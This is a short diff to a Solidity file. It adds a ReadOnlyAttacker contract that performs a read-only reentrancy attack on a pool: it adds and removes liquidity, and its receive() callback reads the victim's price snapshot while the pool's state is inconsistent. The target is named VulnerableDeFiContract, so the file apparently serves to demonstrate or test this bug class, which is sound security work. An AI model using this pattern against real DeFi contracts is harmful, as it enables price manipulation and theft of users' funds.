@@ -87,3 +87,22 @@ contract ReadOnlyPool is ReentrancyGuard, ERC20("LPToken", "LPT") {
     // @notice earn profits for the pool
     function earnProfit() external payable {}
 }
+
+contract ReadOnlyAttacker {
+    ReadOnlyPool pool;
+    VulnerableDeFiContract victim;
+
+    constructor(ReadOnlyPool pool_, VulnerableDeFiContract victim_) payable {
+        victim = VulnerableDeFiContract(victim_);
+        pool = ReadOnlyPool(pool_);
+    }
+
+    receive() external payable {
+        victim.snapshotPrice();
+    }
+
+    function attack() external {
+        pool.addLiquidity{value: address(this).balance}();
+        pool.removeLiquidity();
+    }
+}
